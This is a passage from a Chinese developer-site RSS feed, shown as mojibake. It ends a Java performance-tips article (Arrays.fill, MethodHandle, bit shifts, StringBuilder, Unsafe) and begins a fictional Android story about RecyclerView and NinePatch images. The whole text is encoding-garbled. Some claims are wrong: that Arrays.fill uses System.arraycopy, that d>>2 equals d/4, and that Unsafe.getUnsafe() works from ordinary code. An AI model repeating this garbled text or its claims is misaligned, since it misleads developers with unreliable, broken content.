åœ¨åˆå§‹åŒ–æ•°ç»„æ—¶ï¼Œè®¸å¤šå¼€å‘è€…ä¹ æƒ¯ä½¿ç”¨<code>for</code>å¾ªç¯é€ä¸ªèµ‹å€¼ï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦å¡«å……é»˜è®¤å€¼ï¼ˆå¦‚0æˆ–nullï¼‰çš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; array.length; i++) {
    array[i] = <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>ï¼š<br/>
Javaæä¾›äº†<code>Arrays.fill()</code>æ–¹æ³•ï¼Œå…¶åº•å±‚é€šè¿‡åŸç”Ÿæ–¹æ³•å®ç°ï¼Œæ¯”æ‰‹åŠ¨å¾ªç¯æ•ˆç‡æ›´é«˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
Arrays.fill(array, <span class="hljs-number">0</span>);
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š</p>
<ul>
<li><code>Arrays.fill()</code>æ˜¯JVMå†…éƒ¨ä¼˜åŒ–çš„æ–¹æ³•ï¼Œä½¿ç”¨äº†<code>System.arraycopy</code>æˆ–å…¶ä»–åº•å±‚æ“ä½œã€‚</li>
<li>å®æµ‹è¡¨æ˜ï¼Œå¯¹äºå¤§å‹æ•°ç»„ï¼ˆå¦‚10ä¸‡å…ƒç´ ä»¥ä¸Šï¼‰ï¼Œæ€§èƒ½å¯æå‡30%-50%ã€‚</li>
</ul>
<h3 data-id="heading-4">2. é¿å…åœ¨çƒ­ç‚¹ä»£ç ä¸­ä½¿ç”¨åå°„</h3>
<p><strong>é—®é¢˜åœºæ™¯</strong>ï¼š<br/>
åå°„æ˜¯Javaçš„å¼ºå¤§ç‰¹æ€§ä¹‹ä¸€ï¼Œä½†å…¶æ€§èƒ½å¼€é”€æé«˜ã€‚åœ¨æŸäº›é«˜é¢‘è°ƒç”¨çš„ä»£ç è·¯å¾„ï¼ˆå¦‚åºåˆ—åŒ–ã€æ¡†æ¶åŠ¨æ€è°ƒç”¨ï¼‰ä¸­æ»¥ç”¨åå°„ä¼šå¯¼è‡´æ˜¾è‘—æ€§èƒ½ä¸‹é™ã€‚</p>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li><strong>ç¼“å­˜åå°„ç»“æœ</strong>ï¼šå°†<code>Method</code>ã€<code>Field</code>ç­‰å¯¹è±¡ç¼“å­˜èµ·æ¥å¤ç”¨ã€‚</li>
<li><strong>æ›¿æ¢ä¸ºMethodHandleæˆ–LambdaMetafactory</strong>ï¼šJava 7+çš„<code>MethodHandle</code>å’ŒJava 8+çš„<code>LambdaMetafactory</code>æ€§èƒ½æ¥è¿‘ç›´æ¥è°ƒç”¨ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">MethodHandles.<span class="hljs-type">Lookup</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> MethodHandles.lookup();
<span class="hljs-type">MethodHandle</span> <span class="hljs-variable">handle</span> <span class="hljs-operator">=</span> lookup.findVirtual(MyClass.class, <span class="hljs-string">"myMethod"</span>, MethodType.methodType(<span class="hljs-keyword">void</span>.class));
handle.invokeExact(myInstance);
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š</p>
<ul>
<li>åå°„è°ƒç”¨éœ€è¦æ£€æŸ¥è®¿é—®æƒé™ã€å‚æ•°ç±»å‹ç­‰ï¼Œè€Œ<code>MethodHandle</code>åœ¨JVMå±‚é¢åšäº†æ›´å¤šä¼˜åŒ–ã€‚</li>
<li>LambdaMetafactoryç”Ÿæˆçš„CallSiteå¯ä»¥å®Œå…¨é¿å¼€åå°„å¼€é”€ã€‚</li>
</ul>
<h3 data-id="heading-5">3. ä½¿ç”¨ä½è¿ç®—æ›¿ä»£ä¹˜é™¤æ³•</h3>
<p><strong>é—®é¢˜åœºæ™¯</strong>ï¼š<br/>
åœ¨å¯†é›†è®¡ç®—çš„åœºæ™¯ä¸­ï¼ˆå¦‚å›¾åƒå¤„ç†ã€ç§‘å­¦è®¡ç®—ï¼‰ï¼Œä¹˜é™¤æ³•çš„å¼€é”€ä¼šæˆä¸ºç“¶é¢ˆã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> b * <span class="hljs-number">2</span>;
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> d / <span class="hljs-number">4</span>;
</code></pre>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>ï¼š<br/>
å¯¹äº2çš„å¹‚æ¬¡æ–¹çš„ä¹˜é™¤æ³•ï¼Œå¯ä»¥ç”¨ä½è¿ç®—æ›¿ä»£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> b &lt;&lt; <span class="hljs-number">1</span>; <span class="hljs-comment">// b * 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> d &gt;&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// d / 4</span>
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š</p>
<ul>
<li>CPUæ‰§è¡Œä½è¿ç®—çš„é€Ÿåº¦è¿œå¿«äºä¹˜é™¤æ³•ï¼ˆé€šå¸¸åªéœ€1ä¸ªæ—¶é’Ÿå‘¨æœŸï¼‰ã€‚</li>
<li>JITç¼–è¯‘å™¨è™½ç„¶ä¼šè‡ªåŠ¨ä¼˜åŒ–éƒ¨åˆ†ç®€å•ä¹˜æ³•ä¸ºç§»ä½æ“ä½œï¼Œä½†å¹¶éæ‰€æœ‰æƒ…å†µéƒ½èƒ½è¦†ç›–ã€‚</li>
</ul>
<h3 data-id="heading-6">4. Stringæ‹¼æ¥ä¼˜å…ˆé€‰æ‹©StringBuilderè€Œé"+"</h3>
<p><strong>é—®é¢˜åœºæ™¯</strong>ï¼š<br/>
è®¸å¤šå¼€å‘è€…ä¹ æƒ¯ç”¨"+"æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œä½†åœ¨å¾ªç¯æˆ–é«˜é¢‘è°ƒç”¨ä¸­ä¼šäº§ç”Ÿå¤§é‡ä¸´æ—¶å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    result += <span class="hljs-string">"value"</span>; <span class="hljs-comment">// O(nÂ²)å¤æ‚åº¦ï¼</span>
}
</code></pre>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>ï¼š<br/>
æ˜¾å¼ä½¿ç”¨<code>StringBuilder</code>å¯ä»¥é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ†é…å’Œå¤åˆ¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    sb.append(<span class="hljs-string">"value"</span>);
}
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> sb.toString();
</code></pre>
<p>é«˜çº§æŠ€å·§ï¼š</p>
<ul>
<li><strong>é¢„è®¾StringBuilderå®¹é‡</strong>: <code>new StringBuilder(estimatedSize)</code>å¯å‡å°‘æ‰©å®¹æ¬¡æ•°ã€‚</li>
<li>Java9+çš„å­—ç¬¦ä¸²æ‹¼æ¥(<code>invokedynamic</code>)å·²ä¼˜åŒ–å•è¡Œ"+"çš„æ€§èƒ½é—®é¢˜ã€‚</li>
</ul>
<p>###5.åˆ©ç”¨Unsafeç±»è¿›è¡Œç›´æ¥å†…å­˜æ“ä½œ</p>
<p>é—®é¢˜åœºæ™¯ï¼š
æŸäº›ä½å»¶è¿Ÿåº”ç”¨(å¦‚é‡‘èäº¤æ˜“ç³»ç»Ÿ)éœ€è¦ç»•è¿‡JVMçš„å®‰å…¨æ£€æŸ¥æ¥ç›´æ¥æ“ä½œå†…å­˜ã€‚</p>
<p>ä¼˜åŒ–æ–¹æ¡ˆï¼š
sun.misc.Unsafeæä¾›äº†ä¸€ç³»åˆ—åº•å±‚æ“ä½œ:</p>
<pre><code class="hljs language-java" lang="java">Unsafe unsafe=Unsafe.getUnsafe();
<span class="hljs-type">long</span> address=unsafe.allocateMemory(<span class="hljs-number">1024</span>);<span class="hljs-comment">//åˆ†é…å †å¤–å†…å­˜ </span>
unsafe.putInt(address,<span class="hljs-number">123</span>);<span class="hljs-comment">//ç›´æ¥å†™å…¥æ•°æ® </span>
</code></pre>
<p>æ³¨æ„äº‹é¡¹:
-Unsafeä¸ä¿è¯è·¨ç‰ˆæœ¬å…¼å®¹æ€§
-RISKY:å¯èƒ½å¼•å‘Segmentation Fault</p>
<p>##æ€»ç»“</p>
<p>æœ¬æ–‡ä»‹ç»çš„5ç§æŠ€å·§æ¶µç›–äº†ä»åŸºç¡€è¯­æ³•åˆ°é«˜çº§APIçš„ä½¿ç”¨æ–¹å¼:
1.Arrays.fill()åŠ é€Ÿæ•°ç»„åˆå§‹åŒ–
2.MethodHandleä»£æ›¿åå°„
3.ä½è¿ç®—ä¼˜åŒ–è®¡ç®—å¯†é›†å‹ä»»åŠ¡
4.StringBuilderå‡å°‘ä¸´æ—¶å¯¹è±¡
5.Unsafeå®ç°æè‡´çš„æ§åˆ¶æƒ</p>
<p>è¿™äº›æŠ€æœ¯å¹¶éé€‚åˆæ‰€æœ‰åœºæ™¯ä½†èƒ½åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¸¦æ¥æ˜¾è‘—æå‡ -å…³é”®æ˜¯ç†è§£å…¶èƒŒåçš„åŸç†å¹¶åœ¨åˆé€‚çš„æ—¶æœºåº”ç”¨å®ƒä»¬ ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ä¼˜åŒ–RecycleView ä¸‰äººé½èšå¿˜å¿§æ„]]></title>    <link>https://juejin.cn/post/7596905015367483392</link>    <guid>https://juejin.cn/post/7596905015367483392</guid>    <pubDate>2026-01-20T00:30:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367483392" data-draft-id="7596906473306570802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ä¼˜åŒ–RecycleView ä¸‰äººé½èšå¿˜å¿§æ„"/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2026-01-20T00:30:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ä¼˜åŒ–RecycleView ä¸‰äººé½èšå¿˜å¿§æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:30:26.000Z" title="Tue Jan 20 2026 00:30:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><p><em>æœ¬ç³»åˆ—ä¸º Android æŠ€æœ¯èŒåœºé¢˜æè™šæ„å°è¯´ï¼Œæ‰€æœ‰ç™»åœºäººç‰©ã€å…¬å¸åç§°ã€ç»„ç»‡æ¶æ„åŠç›¸å…³æƒ…èŠ‚å‡ä¸ºåˆ›ä½œæ‰€éœ€è™šæ„è€Œæ¥ï¼Œè‹¥æœ‰é›·åŒï¼Œçº¯å±å¶ç„¶ã€‚ä¹¦ä¸­æ¶‰åŠçš„æŠ€æœ¯çŸ¥è¯†ç»ä¸“ä¸šæ¢³ç†ï¼Œä»…ä¾›å‚è€ƒã€‚</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84246b7f2e49422c9b9d7abd8066c4c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473826&amp;x-signature=KIUNMAhjw%2F0YrbG9GOZuaTz4s%2B4%3D" alt="0.png" loading="lazy"/></p>
<h2 data-id="heading-0">åï¼‰ä¼˜åŒ–RecycleView ä¸‰äººé½èšå¿˜å¿§æ„</h2>
<p>æœ‰äº†ä¸Šä¸€æ¬¡ <code>View</code> ä¼˜åŒ–çš„å¤§é‡ç»éªŒï¼Œç»„å†…æ¸æ¸å½¢æˆäº†ä¸€ç§é»˜å¥‘ã€‚å‡¡æ˜¯æ¶‰åŠ <code>View</code> ä¼˜åŒ–ç›¸å…³çš„éœ€æ±‚ï¼Œéƒ½ä¼šè‡ªç„¶è€Œç„¶åœ°äº¤åˆ°æ—å“æ‰‹ä¸­ã€‚</p>
<p>è¿™ä¸ï¼Œæ–°é—»æ¨¡å—çš„è¿­ä»£ä¼˜åŒ–ï¼Œä¹Ÿé¡ºç†æˆç« ç”±ä»–ç‰µå¤´è´Ÿè´£ã€‚</p>
<p>ä½œä¸ºè¯¥æ¨¡å— UI çš„æ ¸å¿ƒå¼€å‘ä¼˜åŒ–äººå‘˜ã€‚æ—å“æ·±çŸ¥è½¦æœºç«¯æ–°é—»å±•ç¤ºçš„ç—›ç‚¹ï¼Œä¸ä»…è¦ä¿éšœæ»‘åŠ¨æµç•…ï¼Œæ›´è¦é€‚é…å¤æ‚è½¦è½½åœºæ™¯ï¼Œä»å¸ƒå±€æ¶æ„åˆ°ç»†èŠ‚å‘ˆç°ï¼Œæ¯ä¸€å¤„éƒ½å®¹ä¸å¾—åŠç‚¹é©¬è™ã€‚</p>
<p>è¿™å¤©ä¸€æ—©ï¼Œåˆšåˆ°å·¥ä½ï¼Œè®¾è®¡å²—çš„äº§å“åŒäº‹å°±æ‰¾è¿‡æ¥ï¼šâ€œæ—å“ï¼Œæ–°é—»å¡ç‰‡é‡ŒèŠå¤©å¯¹è¯çš„èƒŒæ™¯å›¾ï¼Œæ‹‰ä¼¸åè¾¹ç¼˜éƒ½ç³Šäº†ï¼Œä½ çœ‹çœ‹æ€ä¹ˆå¤„ç†ï¼Ÿâ€</p>
<p>æ—å“æŸ¥çœ‹ UI èµ°æŸ¥çš„ç»“æœï¼Œæœç„¶ï¼Œæ™®é€š PNG æ ¼å¼çš„å¯¹è¯æ°”æ³¡ï¼Œåœ¨ä¸åŒé•¿åº¦çš„æ–‡æœ¬é€‚é…ä¸‹ï¼Œå››è§’æ‹‰ä¼¸å˜å½¢ï¼Œè¾¹ç¼˜çº¿æ¡æ¨¡ç³Šä¸æ¸…ã€‚</p>
<p>â€œå•§ï¼Œæœç„¶è¿™æè½¦è½½çš„ UI å°±æ˜¯æ‹‰èƒ¯ï¼Œè¿™ç‚¹ç»†èŠ‚éƒ½æ²¡å¤„ç†å¥½ã€‚â€ä»–æš—è‡ªæŠ±æ€¨ä¸€å¥ï¼Œå¿ƒé‡Œå´å·²å¿«é€Ÿæ•²å®šä¼˜åŒ–æ–¹æ¡ˆâ€”â€”ç”¨ .9 å›¾æ¥è§£å†³ã€‚</p>
<p>â€œè¿™å¾—ç”¨ .9 å›¾æ¥ä¼˜åŒ–ã€‚â€æ—å“ç«‹åˆ»ç»™å‡ºæ–¹æ¡ˆï¼Œé¡ºæ‰‹æ‰“å¼€å·¥å…·æ¼”ç¤ºèµ·æ¥ï¼Œâ€œ.9 å›¾å…¨ç§°æ˜¯ NinePatch å›¾ï¼Œæœ¬è´¨æ˜¯å¸¦æ‹‰ä¼¸åŒºåŸŸå®šä¹‰çš„ PNGï¼Œæ ¸å¿ƒå°±æ˜¯é€šè¿‡ <code>1px</code> çš„é€æ˜è¾¹æ¡†ï¼Œåˆ’åˆ†å‡ºå›ºå®šåŒºåŸŸå’Œå¯æ‹‰ä¼¸åŒºåŸŸã€‚â€</p>
